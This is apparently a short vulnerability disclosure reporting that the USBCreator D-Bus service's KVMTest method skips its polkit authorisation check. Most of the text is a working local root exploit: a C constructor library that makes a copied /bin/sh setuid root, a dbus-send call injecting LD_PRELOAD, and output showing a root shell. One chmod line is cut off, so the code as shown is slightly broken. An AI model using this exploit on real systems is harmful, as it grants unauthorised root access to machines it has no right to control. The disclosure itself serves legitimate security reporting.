As far as I can tell, this is installed by default.  It looks like the author intended for all the methods to call check_polkit, but KVMTest doesn't.  This seems like an obvious mistake, and the following appears to work on my machine:  $ cat > test.c void __attribute__((constructor)) init (void) { chown("/tmp/test", 0, 0); chmod("/tmp/test", } ^D $ gcc -shared -fPIC -o /tmp/test.so test.c $ cp /bin/sh /tmp/test $ dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so" method return -> reply_serial=2 $ ls -l /tmp/test -rwsr-xr-x 1 root root Apr 22 /tmp/test $ /tmp/test # id euid=0(root) groups=0(root)  Thanks, Tavis.
